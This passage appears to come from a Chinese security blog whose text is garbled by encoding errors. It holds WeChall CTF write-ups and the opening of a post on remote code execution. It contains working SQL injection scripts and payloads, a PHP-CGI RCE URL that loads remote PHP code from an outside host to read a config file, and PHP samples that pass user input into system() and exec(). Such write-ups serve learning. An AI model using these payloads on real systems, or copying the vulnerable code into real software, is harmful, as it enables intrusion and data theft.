    #f = opener.open(number_url)
    #html = f.read()
    #html = urllib2.urlopen(number_url).read()
    #soup = BeautifulSoup(html)
    resp = requests.get(number_url, cookies=cookie)
    res =resp.content
    soup = BeautifulSoup(res)
    div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;})
    movie_new = div_new.get_text()
    print movie_new
get_number()

def get_answer():
    post_data = {
        &apos;solution&apos;: &apos;&apos;,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; 
    resp = requests.post(url, cookies=cookie, data=post_data)
    # print resp.text
    d = H.document_fromstring(resp.text)
    import re
    ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;)
    text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content()
    ans = ar.findall(text)[0]

    print ans 

    post_data = {
        &apos;solution&apos;: ans,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    resp = requests.post(url, cookies=cookie, data=post_data)
    print resp.text
get_answer()
</code></pre><p>è¿è¡Œç»“æœä¸ºï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_yinshifenjie.png" alt=""></p>
<h2 id="Py-Tong"><a href="#Py-Tong" class="headerlink" title="Py-Tong"></a>Py-Tong</h2><p>æŸ¥çœ‹ Python æºä»£ç ï¼Œå¯ä»¥å‘ç°ï¼Œè¯¥ç¨‹åºä¼šè¯»å–ä¸€ä¸ªä½ æŒ‡å®šçš„æ–‡ä»¶ä¸¤æ¬¡ã€‚</p>
<pre><code>å¦‚æœç¬¬ä¸€æ¬¡è¯»å–æˆåŠŸä¹‹åï¼Œç¬¬äºŒæ¬¡å°è¯•è¯»å–å¤±è´¥ï¼Œè¿”å›trueã€‚
å¦‚æœç¬¬ä¸€æ¬¡å’Œç¬¬äºŒæ¬¡è¯»å–å¾—åˆ°çš„å†…å®¹ä¸ä¸€æ ·ï¼Œè¿”å›trueã€‚
</code></pre><p>è¿™æ ·ï¼ŒçŸ¥é“äº†è¿™äº›ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œå»å’Œè¿™ä¸ªç¨‹åºè¿›è¡Œç«äº‰ã€‚</p>
<h2 id="Blinded-by-the-light"><a href="#Blinded-by-the-light" class="headerlink" title="Blinded by the light"></a>Blinded by the light</h2><p>ç›²æ³¨</p>
<p>ä¸»è¦çš„ä»£ç ä¸ºï¼š</p>
<blockquote>
<p>$query = â€œSELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password=â€™$passwordâ€™â€;</p>
</blockquote>
<p>è¿™é‡Œçš„ password æ˜æ˜¾æ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±å¸¦å…¥æŸ¥è¯¢ã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ OR ç›²æ³¨æ¥è®©å®ƒè¿”å›ä¸åŒçš„é¡µé¢ï¼Œå€Ÿæ­¤æ¥åˆ¤æ–­è¯­å¥çš„æ­£ç¡®æ€§ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>#!/usr/bin/env python2
import urllib
import urllib2
def makePayload(statement):
    return &quot;&apos; or substring(password, %d, 1)%s&apos;%s&quot; % (statement[0], statement[1], statement[2])
def checkResponse(response):
    return response.find(&quot;Welcome back&quot;) &gt; 0
def doAssert(statement):
    url = &apos;http://www.wechall.net/challenge/blind_light/index.php&apos;
    values = {&apos;injection&apos;:makePayload(statement),&apos;inject&apos;:&apos;Inject&apos;}
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    req.add_header(&apos;cookie&apos;,&apos;WC=8448003-14306-bFzUNqXxpwMud1xu&apos;)
    response = urllib2.urlopen(req)
    content = response.read()
    return checkResponse(content)
if __name__ == &quot;__main__&quot;:
    alphalist = &quot;0123456789ABCDEF&quot;
    result = []
    for idx in range(1,33):
        start = 0
        end = 16 #[start, end)
        while (start &lt; end):
            print(&quot;[%d, %d)&quot; % (start, end))
            if (end - start == 1):
                result.append(alphalist[start])
                break
            else:
                middle = (start + end)/2
                if(doAssert([idx, &apos;&lt;&apos;, alphalist[middle]])):
                    end = middle
                else:
                    start = middle
        print &apos;&apos;.join(result)
</code></pre><h2 id="Training-Net-Ports"><a href="#Training-Net-Ports" class="headerlink" title="Training: Net Ports"></a>Training: Net Ports</h2><p>è®©æˆ‘ä»¬é“¾æ¥è¿™ä¸ªä¸»æœºçš„42ç«¯å£ã€‚</p>
<p>curlä½¿ç”¨ â€“local-port å‚æ•°,å¸¦ä¸Šè‡ªå·±çš„cookies</p>
<blockquote>
<p>sudo curl â€“local-port 42 -c â€˜WC=YOUR_COOKIESâ€™ <a href="http://www.wechall.net/challenge/training/net/ports/index.php" target="_blank" rel="external">http://www.wechall.net/challenge/training/net/ports/index.php</a></p>
</blockquote>
<h2 id="Pimitive-Encryption"><a href="#Pimitive-Encryption" class="headerlink" title="Pimitive Encryption"></a>Pimitive Encryption</h2><p>ç”¨onetime-pad xoråŠ å¯†çš„zipæ–‡ä»¶,é€šè¿‡zipçš„magic numberå¯ä»¥ç¡®å®šonetime-padçš„å‰å››ä½,è½¬æ¢æˆcharè¾“å‡ºåå‘ç°æ˜¯3.14</p>
<p>äºæ˜¯è¯¥ç”¨ä»€ä¹ˆè§£å¯†å°±å¾ˆæ˜æ˜¾äº†,ä¸‹è½½ä¸€ä¸ªpiä¹‹åxorä¸€ä¸‹,å°±èƒ½è¿˜åŸäº†</p>
<h2 id="Repeating-History"><a href="#Repeating-History" class="headerlink" title="Repeating History"></a>Repeating History</h2><p>ç½‘é¡µå’Œgithubæ˜¯å¯¹åº”çš„ã€‚ã€‚</p>
<p>å…ˆç¿»åˆ°ç¬¬ä¸€ä¸ª </p>
<pre><code>https://github.com/gizmore/gwf3/blob/565015f6561776c90f77e5623d978d70ca7bf2d3/www/challenge/subversive/repeating/what_do_you_want_here.php
</code></pre><p>ç„¶årepoå†…æœç´¢solutionå‘ç°äº†ä¸€ä¸ª </p>
<pre><code>https://github.com/gizmore/gwf3/blob/a98616544df4997a1bef7dfc109d35b3c6e0aab9/www/challenge/subversive/history/install.php
</code></pre><p>md5è§£å‡ºæ¥æ˜¯wrongï¼Œç¿»ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„commitè®°å½•</p>
<pre><code>https://github.com/gizmore/gwf3/commit/a98616544df4997a1bef7dfc109d35b3c6e0aab9
-$solution = â€˜NothingHereMoveAlongâ€™;
+$solution = â€˜2bda2998d9b0ee197da142a0447f6725â€™;
</code></pre><p>æ‹¼æ¥ä¸€ä¸‹ï¼šInDaxInNothingHereMoveAlong</p>
<h2 id="Host-Me"><a href="#Host-Me" class="headerlink" title="Host Me"></a>Host Me</h2><p>æ”¹httpå¤´çš„Hostã€‚è¿™ç‚¹å¾ˆç®€å•ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå®ƒå†…ç½‘æœ‰ä¸€å°æœºå™¨ä¹Ÿå«åšlocalhostã€‚è¿™å°±å¯¼è‡´äº†å¦‚æœæ˜¯ç®€ç®€å•å•åœ°è®¿é—®localhostçš„è¯ï¼Œå…¶å®è®¿é—®çš„æ˜¯é‚£å°æœºå™¨è€Œéæˆ‘ä»¬åšé¢˜çš„æœºå™¨ã€‚<br>ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°±è¦ä½¿ç”¨ç»å¯¹è·¯å¾„çš„ URLï¼Œå°±æ˜¯ GET åé¢çš„ç½‘å€è¡¥å…¨ï¼Œç„¶å Host å†å†™æˆlocalhostå°±å¯ä»¥äº†</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_hostme.png" alt=""></p>
<h2 id="Stegano-Woman"><a href="#Stegano-Woman" class="headerlink" title="Stegano Woman"></a>Stegano Woman</h2><p>æ‰“å¼€ä¹‹åæ³¨é‡Šéƒ¨åˆ†ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€</p>
<p>å‘ç°æ˜¯09(tab)å’Œ20(space),æŠŠå…¶ä¸­çš„ä¸€ä¸ªå½“ä½œ1å¦ä¸€ä¸ªå½“ä½œ0,æ¢æˆäºŒè¿›åˆ¶å†è½¬æ¢æˆå­—ç¬¦ä¸²ä¹‹åè¾“å‡ºå³å¯</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_stegano_woman.png" alt=""></p>
<h2 id="Quangcurrency"><a href="#Quangcurrency" class="headerlink" title="Quangcurrency"></a>Quangcurrency</h2><p>è¿™é¢˜ä¸ä¼šï¼Œæ²¡çœ‹æ‡‚ï¼Œé™„ä¸€ä¸ªåˆ«äººçš„writeup</p>
<pre><code>è¯»é¢˜æ˜¯å¾ˆé‡è¦çš„â€¦æ¥æŠŠè¿™ä¸ªé¢˜ç›®å¤§æ¦‚å¿µå‡ºæ¥,å®ƒæ˜¯ä»€ä¹ˆ?concurrencyå¯¹ä¸å¯¹?åˆæ˜¯ä¸€é“ç«æ€çš„é¢˜ç›®.

åªè¦å¡ç€buyå’Œclick,æƒ³æ–¹è®¾æ³•è·‘åˆ°10ä¸ªitemå°±å¯ä»¥

cookie = {
    &apos;WC&apos;: &apos;8429765-12152-0vjRl2XoKWFYAmvh&apos;
}

def f1():
    requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/click.php&apos;, cookies=cookie)

def f2():
    requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/buy.php&apos;, cookies=cookie)
import requests
import threading
import time

import lxml
import lxml.html as H
import re

r = re.compile(r&apos;\w+: (\d+)&apos;)

i = 0 
while True:
    i += 1
    print &quot;turn %d&quot; % i
    print &apos;start click&apos;
    t1 = threading.Thread(target = f1)
    print &apos;start buy&apos;
    t2 = threading.Thread(target = f2)

    t1.start()
    t2.start()
    t1.join()
    t2.join()

    text = requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/stats.php&apos;, cookies=cookie).text
    d = H.document_fromstring(text)
    msg = d.xpath(&apos;//div[@class=\&apos;box_c\&apos;]&apos;)[0]
    # import pdb;pdb.set_trace()
    a,b,c  = r.findall(msg.text_content())
    print &apos;get %s item &apos; % c

    if int(c)&gt;=10:
        break

    if int(a) &lt; 1000:
        print &apos;reset&apos;
        requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/reset.php&apos;, cookies=cookie)
å‹æƒ…æç¤º,å®ƒè‚¯å®šå¯ä»¥è·‘å‡ºæ¥,ä½†å®ƒæ°¸è¿œä¸ä¼šåœä¸‹,æœ€å¥½è‡ªå·±ç¡®è®¤è¿™ä¸ªchallengeæ˜¯ä¸æ˜¯å·²ç»å®Œæˆäº†.
</code></pre><h2 id="Stop-us"><a href="#Stop-us" class="headerlink" title="Stop us"></a>Stop us</h2><p>å…³é”®åœ¨äºè¿™å¥è¯</p>
<blockquote>
<p>â€˜ignore_user_abortâ€™ =&gt; false</p>
</blockquote>
<p>è¿™å¥è¯æ‰€é€ æˆçš„åæœå°±æ˜¯ï¼Œä¸€ä¸ªè„šæœ¬å½“ç”¨æˆ·æ–­å¼€è¿æ¥ï¼ˆå…³é—­çª—å£ä¹‹ç±»çš„ï¼‰ï¼Œè¿™ä¸ªè„šæœ¬å°±ä¼šè¢«å¼ºè¡Œç»ˆæ­¢ã€‚<br>å†çœ‹çœ‹ php è„šæœ¬ï¼Œå¯ä»¥å‘ç°å®ƒæ˜¯å…ˆç»™æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªåŸŸåï¼Œä¹‹åæ‰æ‰£è´¹çš„ã€‚<br>æ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨æ‰£è´¹å‰å…³æ‰é¡µé¢å³å¯ã€‚</p>
<h2 id="Screwed-Signup"><a href="#Screwed-Signup" class="headerlink" title="Screwed Signup"></a>Screwed Signup</h2><p>ISCC2016çš„ä¸€é“é¢˜</p>
<p>SQL tableé‡Œusernameæœ€å¤š24ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯preg_matchæ£€æŸ¥æ—¶å¯ä»¥æœ€å¤šåˆ°64ä¸ªã€‚äºæ˜¯è¿™é‡Œå¯èƒ½é€ æˆæˆªæ–­.</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_screwed_signup.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_screwed_signup2.png" alt=""></p>
<h2 id="Table-Names-II"><a href="#Table-Names-II" class="headerlink" title="Table Names II"></a>Table Names II</h2><pre><code>http://www.wechall.net/challenge/table_names/challenge.php
?username=&apos; union select database(),2,group_concat(0x3f,table_name) from information_schema.tables where table_schema=database() -- 
&amp;password=test
&amp;login=login
</code></pre><p>ä¹Ÿå¯ä»¥è¿™æ ·ï¼š</p>
<pre><code>http://www.wechall.net/challenge/table_names/challenge.php
?username=&apos; union select 1,2,info from information_schema.processlist-- 
&amp;password=test
&amp;login=login
</code></pre><p>è¿è¡Œç»“æœä¸ºï¼š</p>
<pre><code>Welcome back gizmore_tableu61

Your personal welcome message is: ?aaawrong,?usertableus4

This ensures you are not on a fake evil phising site.
</code></pre><p>æäº¤ï¼šgizmore_tableu61_usertableus4</p>
<h2 id="AUTH-me"><a href="#AUTH-me" class="headerlink" title="AUTH me"></a>AUTH me</h2><p>SSL åŠ å¯†ä¼ è¾“çš„é—®é¢˜ã€‚</p>
<p>è®¿é—®<code>https://authme.wechall.net/challenge/space/auth_me/www/index.php</code></p>
<p>æç¤ºè¯´ï¼š</p>
<pre><code>Error

Renegotiation is not allowed
</code></pre><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å»æ‰¾è¿™ä¸ªè¯ä¹¦ï¼Œç„¶åå¯¼å…¥ã€‚</p>
<p>å…¶å®ï¼Œä½ è§‚å¯Ÿä¸‹å®ƒ apache.conf çš„ç½‘å€ï¼Œ</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/space/auth\_me/**find_me/apache.conf**" target="_blank" rel="external">http://www.wechall.net/challenge/space/auth\_me/**find_me/apache.conf**</a></p>
</blockquote>
<p>ä¼šå‘ç°å«åš find_me çš„æ–‡ä»¶å¤¹ã€‚ç›´æ¥è®¿é—®</p>
<pre><code>apache.conf               05-May-2015 21:18  1.0K  
client.crt                05-May-2015 21:18  1.5K  
client.key                05-May-2015 21:18  3.2K  
client.p12                05-May-2015 21:18  4.7K  
server.crt                05-May-2015 21:18  1.5K  
</code></pre><p>å¯¼å…¥client.p12 å³å¯</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_auth_me.png" alt=""></p>
<h2 id="Warchall-Live-RCE"><a href="#Warchall-Live-RCE" class="headerlink" title="Warchall: Live RCE"></a>Warchall: Live RCE</h2><p>å…·ä½“æ¼æ´æ˜¯ï¼šCVE-2012-1823ï¼ˆPHP-CGI RCEï¼‰</p>
<p>åœ¨åœ°å€åé¢åŠ è¿›å‚æ•°è¿è¡Œå¯¹åº”çš„php-cgi å‚æ•°çš„è¡Œä¸º,æ ¹æ®è§£é‡Šï¼Œå¦‚æœquery stringä¸­ä¸åŒ…å«æœªurlencodedçš„ç­‰å·ï¼Œé‚£ä¹ˆæ•´ä¸ªqueryä¼šä»¥ç©ºæ ¼åˆ†è¯ï¼Œä¼ ç»™php-cgiã€‚äºæ˜¯æˆ‘ä»¬ä¼ -sï¼Œå°±ä¼šæŠŠphpæ–‡ä»¶æºç å›æ˜¾ã€‚</p>
<p>ä¾‹å¦‚ index.php?-s</p>
<p>ç›¸å‚äº/usr/bin/php53-cgi/php-cgi -f index.php -s</p>
<p>php-cgi â€“helpå¦‚ä¸‹</p>
<pre><code>Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;]
    php-cgi &lt;file&gt; [args...]
    -a               Run interactively
    -b &lt;address:port&gt;|&lt;port&gt; Bind Path for external FASTCGI Server mode
    -C               Do not chdir to the script&apos;s directory
    -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory
    -n               No php.ini file will be used
    -d foo[=bar]     Define INI entry foo with value &apos;bar&apos;
    -e               Generate extended information for debugger/profiler
    -f &lt;file&gt;        Parse &lt;file&gt;.  Implies `-q&apos;
    -h               This help
    -i               PHP information
    -l               Syntax check only (lint)
    -m               Show compiled in modules
    -q               Quiet-mode.  Suppress HTTP Header output.
    -s               Display colour syntax highlighted source.
    -v               Version number
    -w               Display source with stripped comments and whitespace.
    -z &lt;file&gt;        Load Zend extension &lt;file&gt;.
    -T &lt;count&gt;       Measure execution time of script repeated &lt;count&gt; times.
</code></pre><p>æŸ¥çœ‹æºç ï¼š</p>
<blockquote>
<p><a href="http://rce.warchall.net/?-s" target="_blank" rel="external">http://rce.warchall.net/?-s</a></p>
</blockquote>
<p>é‡Œé¢åŒ…å«äº†ä¸€ä¸ª<code>../config.php</code>,æ‰€ä»¥æˆ‘è¦å»è¯»å®ƒã€‚</p>
<pre><code>åœ¨åˆšå¼€å§‹è¿›çš„é¡µé¢é‡Œå‘ç°index.phpçš„ç›®å½•ä¸ºï¼š

[SCRIPT\_FILENAME] =&gt; /home/level/20_live_rce/www/index.php

æ‰€ä»¥../config.php çš„ç»å¯¹è·¯å¾„æ˜¯ï¼š

/home/level/20_live_rce/config.php
</code></pre><p>php-cgiå‚æ•°ä¸­ï¼š</p>
<p>d foo[=bar]     Define INI entry foo with value â€˜barâ€™</p>
<pre><code>-dallow_url_include=On

-dauto_prepend_file=/tmp/2.php
</code></pre><p>åœ¨/tmpé‡Œå»ºç«‹ä¸€ä¸ª2.phpå†…å®¹æ˜¯</p>
<pre><code>&lt;?php
exec(&quot;cat /home/level/20_live_rce/config.php&quot;,$out);
print_r($out);
?&gt;
</code></pre><p>æ„é€ åœ°å€ï¼š</p>
<blockquote>
<p><a href="http://rce.warchall.net/?-d" target="_blank" rel="external">http://rce.warchall.net/?-d</a> allow_url_include=On -d auto_prepend_file=<a href="http://oacotcyq8.bkt.clouddn.com/2.php" target="_blank" rel="external">http://oacotcyq8.bkt.clouddn.com/2.php</a> -n</p>
</blockquote>
<p>urlencode:</p>
<blockquote>
<p><a href="http://rce.warchall.net/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp%3%2f%2foacotcyq8.bkt.clouddn.com%2f2.php+-n" target="_blank" rel="external">http://rce.warchall.net/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp%3%2f%2foacotcyq8.bkt.clouddn.com%2f2.php+-n</a></p>
</blockquote>
<h2 id="Blinded-by-the-lighter"><a href="#Blinded-by-the-lighter" class="headerlink" title="Blinded by the lighter"></a>Blinded by the lighter</h2><p>è¿˜æ˜¯ç›²æ³¨ï¼ŒåŠ æ—¶é—´å»¶è¿Ÿæ³¨å…¥ã€‚</p>
<h2 id="Light-in-the-Darkness"><a href="#Light-in-the-Darkness" class="headerlink" title="Light in the Darkness"></a>Light in the Darkness</h2><p>è¿™é“é¢˜çš„é”™è¯¯ä¼šå›æ˜¾ï¼Œè€Œä¸”é™åˆ¶è¦åœ¨2æ¬¡queryå†…å¾—åˆ°ç­”æ¡ˆï¼Œæ‰€ä»¥ç”¨error basedï¼š</p>
<p>POC1:</p>
<p><code>&#39; or row(1,1) &gt; (select count(*),concat(password,&#39;$&#39;,floor(rand(0)*2))x from (select 1 union select 2 union select 3)a group by x limit 1) #</code></p>
<p>POC2:</p>
<p><code>&#39; or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2)))--</code></p>
<p>åŸç†ï¼š</p>
<blockquote>
<p><a href="http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do" target="_blank" rel="external">http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do</a></p>
</blockquote>
<p>ç®€å•åœ°è¯´ï¼Œfloor(rand(0)*2)ä¼šå¾—åˆ°0,1,1,0â€¦â€¦ç¬¬2ä¸ªå’Œç¬¬3ä¸ªé‡å¤çš„1ä¼šé€ æˆé‡å¤çš„group_keyã€‚è€Œä¸”æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¡Œæ•°å¤§äº3çš„è¡¨ï¼Œæ‰€ä»¥é€‰æ‹©information_schema</p>
<h2 id="Brainfucked"><a href="#Brainfucked" class="headerlink" title="Brainfucked"></a>Brainfucked</h2><p>alert(XXX)xxxä¸º æ–‡ä»¶å†…å®¹ã€‚</p>
<pre><code>function anonymous() {
var s = &apos;UnfudgedDebugStuff&apos;; s = s.length; alert(s); document.location.href=&apos;https://www.google.co.uk&apos;;
}
</code></pre><h2 id="eXtract-Me"><a href="#eXtract-Me" class="headerlink" title="eXtract Me"></a>eXtract Me</h2><p>ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å‘ç°é‡Œé¢ä¸€ç›´æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œåº”è¯¥ä¸æ˜¯è¿™ä¹ˆå¤š</p>
<p>è§£å‹ä¸€æ¬¡ä¹‹åä½¿ç”¨16è¿›åˆ¶æ‰“å¼€</p>
<p>å¯ä»¥å‘ç°æ˜¯ä¸¤ä¸ªå‹ç¼©åŒ…æ‹¼æ¥åœ¨ä¸€èµ·çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠåé¢çš„å‹ç¼©åŒ…æ‰£å‡ºæ¥å³å¯ã€‚</p>
<p>è¿˜æ˜¯è§£å‹ï¼Œå‡ºæ¥ä¸€ä¸ªxaræ–‡ä»¶ï¼Œé€šè¿‡ 7zip è§£å‹ï¼Œå‡ºæ¥ä¸€ä¸ªåˆä¸€ä¸ªå¥‡è‘©æ–‡ä»¶ã€‚ã€‚</p>
<p>ä½†æ˜¯ï¼Œåœ¨è§£å‹é€”ä¸­ä¼šå‘ç°æœ‰ä¸€ä¸ªrar çš„æ³¨é‡Šæ˜¯æœ‰ä¸œè¥¿çš„ã€‚æ‹·è´å‡ºæ¥ï¼Œç”¨è¿™æ•°æ®æ–°å»ºä¸€ä¸ªraræ–‡ä»¶ï¼Œå‘ç°éœ€è¦å¯†ç ã€‚</p>
<p>å¯†ç ä¸ºï¼šL0LYouThInkiTSh0uldB3SoEasY? </p>
<h2 id="Are-you-blind"><a href="#Are-you-blind" class="headerlink" title="Are you blind?"></a>Are you blind?</h2><p>è¿˜æ˜¯ç›²æ³¨ï¼ŒæŠ¥é”™æ¥åˆ¤æ–­ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> WeChall </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ€»ç»“]]></title>
      <url>/2016/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>è¿œç¨‹ä»£ç æ‰§è¡Œæ˜¯æŒ‡ç¨‹åºä»£ç åœ¨å¤„ç†è¾“å…¥è¾“å‡ºçš„æ—¶å€™æ²¡æœ‰ä¸¥æ ¼æ§åˆ¶ã€‚å¯¼è‡´ç”¨æˆ·å¯ä»¥æ„é€ å‚æ•°åŒ…å«æ‰§è¡Œè¿œç¨‹ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œè¿›è€Œè·å–åˆ°æœåŠ¡å™¨æƒé™ï¼Œæ˜¯å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºçš„é€»è¾‘å±‚ä¸Šçš„æ¼æ´</p>
<a id="more"></a>
<h1 id="0x01-OSå‘½ä»¤æ‰§è¡Œ"><a href="#0x01-OSå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x01 OSå‘½ä»¤æ‰§è¡Œ"></a>0x01 OSå‘½ä»¤æ‰§è¡Œ</h1><p>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æŒ‡åº”ç”¨ç¨‹åºå¯¹ä¼ å…¥å‘½ä»¤è¡Œçš„å‚æ•°è¿‡æ»¤ä¸ä¸¥æ ¼å¯¼è‡´æ¶æ„ç”¨æˆ·èƒ½æ§åˆ¶æœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿›è€Œå…¥ä¾µç³»ç»Ÿï¼Œå¯¼è‡´ä¸¥é‡ç ´åçš„é«˜å±æ¼æ´ã€‚(bash,shell)</p>
<p>shellæ˜¯ç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢ï¼Œæä¾›ç”¨æˆ·ä¸å†…æ ¸äº¤äº’æ“ä½œçš„æ¥å£ï¼Œå®ƒæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å¹¶æŠŠå®ƒé€å…¥åˆ°å†…æ ¸å»æ‰§è¡Œã€‚å®é™…ä¸Šshellæ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ï¼Œå®ƒçš„ä¸€ä¸ªé‡è¦ç‰¹æ€§å°±æ˜¯å®ƒè‡ªèº«å°±æ˜¯ä¸€ä¸ªè§£é‡Šå‹çš„ç¨‹åºè¯­è¨€ã€‚</p>
<p>åˆ†ç±»ï¼š</p>
<pre><code>1.1 OSæœ¬èº«å‘½ä»¤æ‰§è¡Œ
1.2 Webå‘½ä»¤æ‰§è¡Œ
1.3 æ•°æ®åº“å‘½ä»¤æ‰§è¡Œ
1.4 ç¬¬ä¸‰æ–¹è½¯ä»¶å‘½ä»¤æ‰§è¡Œ
</code></pre><h1 id="0x02-å‘½ä»¤æ‰§è¡Œæ¨¡å‹"><a href="#0x02-å‘½ä»¤æ‰§è¡Œæ¨¡å‹" class="headerlink" title="0x02 å‘½ä»¤æ‰§è¡Œæ¨¡å‹"></a>0x02 å‘½ä»¤æ‰§è¡Œæ¨¡å‹</h1><h2 id="0x02-1-PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°åˆ©ç”¨"><a href="#0x02-1-PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°åˆ©ç”¨" class="headerlink" title="0x02.1 PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°åˆ©ç”¨"></a>0x02.1 PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°åˆ©ç”¨</h2><p><strong>1ã€systemï¼š</strong>systemå‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨çš„åº”ç”¨ç¨‹åºå¹¶å°†ç›¸åº”çš„æ‰§è¡Œç»“æœè¾“å‡ºï¼Œå‡½æ•°åŸå‹ä¸ºï¼š</p>
<blockquote>
<p>string system(string command,int &amp;return_var)</p>
</blockquote>
<p>å…¶ä¸­ï¼Œcommandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œreturn_varå­˜æ”¾æ‰§è¡Œå‘½ä»¤çš„æ‰§è¡Œåçš„çŠ¶æ€</p>
<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
$dir = $_GET[&quot;dir&quot;];
if(isset($dir))
{
    echo &quot;&lt;pre&gt;&quot;;
    system(&quot;net user&quot;.$dir);
    echo &quot;&lt;/pre&gt;&quot;;
}
?&gt;
</code></pre><p>æ‰§è¡Œç»“æœä¸ºï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_1.png" alt=""><br>ä¸Šè¿°ä»£ç å°±æ˜¯æŠŠdirè¿™ä¸ªå‘½ä»¤å†™æ­»äº†ï¼ŒæŠŠnet useræ‰§è¡Œçš„ç»“æœç»™$dirå˜é‡ã€‚ä½†æ˜¯æ³¨æ„ä¸€äº›è¿æ¥ç¬¦ï¼Œç®¡é“ç¬¦å¦‚ï¼š<code>&amp;,&amp;&amp;,|,||,:</code>ç­‰ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥<code>?dir=| netstat -an</code></p>
<p><strong>æ³¨ï¼š<code>|</code>åªæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œ<code>||</code>å‰åå‘½ä»¤éƒ½æ‰§è¡Œã€‚</strong></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_2.png" alt=""></p>
<p><strong>2ã€execï¼š</strong>execå‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨çš„åº”ç”¨ç¨‹åºï¼Œå‡½æ•°åŸå‹ä¸ºï¼š</p>
<blockquote>
<p>string exec(string command,array &amp;output,int &amp;return_var)</p>
</blockquote>
<p>å…¶ä¸­ï¼Œcommandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œoutputæ˜¯è·å¾—æ‰§è¡Œå‘½ä»¤è¾“å‡ºçš„æ¯ä¸€è¡Œå­—ç¬¦ä¸²ï¼Œreturn_varæ˜¯å­˜æ”¾æ‰§è¡Œå‘½ä»¤åçš„çŠ¶æ€å€¼ã€‚</p>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
$output = array();
echo &quot;&lt;pre&gt;&quot;;
exec($cmd,$output);
echo &quot;&lt;/pre&gt;&quot;;
while(list($key,$value)=each($output))
{
    echo $value.&quot;&lt;br&gt;&quot;;
}
?&gt;
</code></pre><p>æ‰§è¡Œç»“æœä¸ºï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_3.png" alt=""></p>
